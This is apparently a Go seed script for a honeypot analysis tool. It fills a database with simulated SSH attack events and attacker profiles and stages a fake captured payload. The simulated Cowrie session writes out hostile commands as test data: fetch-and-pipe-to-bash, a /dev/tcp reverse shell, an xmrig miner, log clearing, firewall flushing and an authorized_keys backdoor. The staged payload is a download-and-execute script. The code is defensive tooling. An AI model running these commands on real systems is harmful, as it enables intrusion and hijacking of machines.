package main

import (
	"fmt"
	"os"
	"time"

	"github.com/networkshard/shardlure/internal/store"
	"github.com/networkshard/shardlure/pkg/models"
)

func main() {
	home, _ := os.UserHomeDir()
	st, err := store.Open(home + "/.local/share/shardlure/shardlure.db")
	if err != nil { fmt.Println(err); os.Exit(1) }
	defer st.Close()
	now := time.Now().UTC()
	mk := func(off time.Duration, src models.Source, kind models.EventKind, ip, user, cmd, sid, actor string) *models.Event {
		return &models.Event{TS: now.Add(off), Source: src, Kind: kind, SrcIP: ip, Username: user, Command: cmd, SessionID: sid, ActorID: actor, Raw: "{}"}
	}
	events := []*models.Event{
		mk(-3*time.Hour, models.SourceJournal, models.KindFailedPass, "80.94.92.186", "root", "", "", "journal:80.94.92.186"),
		mk(-3*time.Hour+time.Minute, models.SourceJournal, models.KindFailedPass, "80.94.92.186", "admin", "", "", "journal:80.94.92.186"),
		mk(-2*time.Hour, models.SourceJournal, models.KindInvalidUser, "188.84.0.25", "oracle", "", "", "journal:188.84.0.25"),
		mk(-2*time.Hour+30*time.Minute, models.SourceJournal, models.KindInvalidUser, "188.84.0.25", "postgres", "", "", "journal:188.84.0.25"),
		mk(-90*time.Minute, models.SourceJournal, models.KindFailedKey, "193.32.162.151", "git", "", "", "journal:193.32.162.151"),
		mk(-time.Hour, models.SourceJournal, models.KindAccepted, "5.6.7.8", "ubuntu", "", "", "journal:5.6.7.8"),
		mk(-50*time.Minute, models.SourceCowrie, models.KindConnect, "45.67.89.10", "", "", "S1", "cowrie:hassh-aaa"),
		mk(-49*time.Minute, models.SourceCowrie, models.KindFailedPass, "45.67.89.10", "root", "", "S1", "cowrie:hassh-aaa"),
		mk(-48*time.Minute, models.SourceCowrie, models.KindAccepted, "45.67.89.10", "root", "", "S1", "cowrie:hassh-aaa"),
		mk(-47*time.Minute, models.SourceCowrie, models.KindCommand, "45.67.89.10", "root", "uname -a", "S1", "cowrie:hassh-aaa"),
		mk(-47*time.Minute-time.Second, models.SourceCowrie, models.KindCommand, "45.67.89.10", "root", "whoami", "S1", "cowrie:hassh-aaa"),
		mk(-46*time.Minute, models.SourceCowrie, models.KindCommand, "45.67.89.10", "root", "cat /etc/passwd", "S1", "cowrie:hassh-aaa"),
		mk(-46*time.Minute-time.Second, models.SourceCowrie, models.KindCommand, "45.67.89.10", "root", "wget http://malicious.example.cc/x.sh -O /tmp/x", "S1", "cowrie:hassh-aaa"),
		mk(-45*time.Minute, models.SourceCowrie, models.KindCommand, "45.67.89.10", "root", "curl -sL http://1.2.3.4/m | bash", "S1", "cowrie:hassh-aaa"),
		mk(-45*time.Minute-time.Second, models.SourceCowrie, models.KindCommand, "45.67.89.10", "root", "crontab -l", "S1", "cowrie:hassh-aaa"),
		mk(-44*time.Minute, models.SourceCowrie, models.KindCommand, "45.67.89.10", "root", "./xmrig --pool stratum+tcp://pool.io:3333", "S1", "cowrie:hassh-aaa"),
		mk(-43*time.Minute, models.SourceCowrie, models.KindCommand, "45.67.89.10", "root", "history -c", "S1", "cowrie:hassh-aaa"),
		mk(-42*time.Minute, models.SourceCowrie, models.KindCommand, "45.67.89.10", "root", "iptables -F", "S1", "cowrie:hassh-aaa"),
		mk(-41*time.Minute, models.SourceCowrie, models.KindCommand, "45.67.89.10", "root", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "S1", "cowrie:hassh-aaa"),
		mk(-40*time.Minute, models.SourceCowrie, models.KindCommand, "45.67.89.10", "root", "netstat -tunlp", "S1", "cowrie:hassh-aaa"),
		mk(-40*time.Minute-time.Second, models.SourceCowrie, models.KindCommand, "45.67.89.10", "root", "echo ssh-rsa AAAA >> /root/.ssh/authorized_keys", "S1", "cowrie:hassh-aaa"),
		mk(-30*time.Minute, models.SourceCowrie, models.KindConnect, "78.90.12.34", "", "", "S2", "cowrie:hassh-bbb"),
		mk(-29*time.Minute, models.SourceCowrie, models.KindFailedPass, "78.90.12.34", "admin", "", "S2", "cowrie:hassh-bbb"),
		mk(-28*time.Minute, models.SourceCowrie, models.KindFailedPass, "78.90.12.34", "root", "", "S2", "cowrie:hassh-bbb"),
	}
	for i, e := range events {
		if err := st.InsertEvent(e); err != nil {
			fmt.Printf("[%d] insert: %v\n", i, err)
		}
	}
	actors := []models.Actor{
		{ID: "journal:80.94.92.186", Source: "journal", PrimaryIP: "80.94.92.186", Playbook: "opportunistic", Intent: "credential-stuffing", Confidence: 60, FirstSeen: now.Add(-3 * time.Hour), LastSeen: now.Add(-3 * time.Hour), EventCount: 2, UniqueUsers: 2, AttemptsPerHour: 4},
		{ID: "journal:188.84.0.25", Source: "journal", PrimaryIP: "188.84.0.25", Playbook: "opportunistic", Intent: "credential-stuffing", Confidence: 60, FirstSeen: now.Add(-2 * time.Hour), LastSeen: now.Add(-90 * time.Minute), EventCount: 2, UniqueUsers: 2, AttemptsPerHour: 2},
		{ID: "journal:193.32.162.151", Source: "journal", PrimaryIP: "193.32.162.151", Playbook: "opportunistic", Intent: "key-spray", Confidence: 50, FirstSeen: now.Add(-90 * time.Minute), LastSeen: now.Add(-90 * time.Minute), EventCount: 1, UniqueUsers: 1, AttemptsPerHour: 1},
		{ID: "cowrie:hassh-aaa", Source: "cowrie", PrimaryIP: "45.67.89.10", Playbook: "crypto_target", Intent: "crypto-mining", Confidence: 85, FirstSeen: now.Add(-50 * time.Minute), LastSeen: now.Add(-40 * time.Minute), EventCount: 15, UniqueUsers: 1, AttemptsPerHour: 30, HASSH: "hassh-aaa", SSHClient: "SSH-2.0-libssh"},
		{ID: "cowrie:hassh-bbb", Source: "cowrie", PrimaryIP: "78.90.12.34", Playbook: "opportunistic", Intent: "credential-stuffing", Confidence: 50, FirstSeen: now.Add(-30 * time.Minute), LastSeen: now.Add(-28 * time.Minute), EventCount: 3, UniqueUsers: 2, AttemptsPerHour: 12, HASSH: "hassh-bbb", SSHClient: "SSH-2.0-go"},
	}
	for i := range actors {
		if err := st.UpsertActor(&actors[i]); err != nil { fmt.Println("actor:", err) }
	}

	// Stage a fake captured payload on disk so Slice G has something
	// to inspect. Mimics the cowrie capture pipeline writing to
	// $HOME/.local/share/shardlure/captures/<sha>.bin.
	capDir := home + "/.local/share/shardlure/captures"
	_ = os.MkdirAll(capDir, 0o755)
	fakeBody := []byte("#!/bin/bash\n# downloader\nwget http://1.2.3.4/payload.elf -O /tmp/payload\nchmod +x /tmp/payload\n/tmp/payload\n")
	fakeSHA := "deadbeefcafebabe000102030405060708090a0b0c0d0e0f10111213141516"
	fakePath := capDir + "/" + fakeSHA + ".bin"
	_ = os.WriteFile(fakePath, fakeBody, 0o644)
	_ = st.RecordArtifact(store.Artifact{
		TS: now.Add(-44 * time.Minute), SrcIP: "45.67.89.10", SessionID: "S1",
		ActorID: "cowrie:hassh-aaa", URL: "http://1.2.3.4/payload.elf",
		LocalPath: fakePath, SHA256: fakeSHA, SizeBytes: int64(len(fakeBody)),
		Origin: "cowrie-curl", Status: "fetched",
	})

	n, _ := st.EventCount()
	fmt.Printf("seeded %d events (DB shows %d), %d actors, 1 payload\n", len(events), n, len(actors))
}
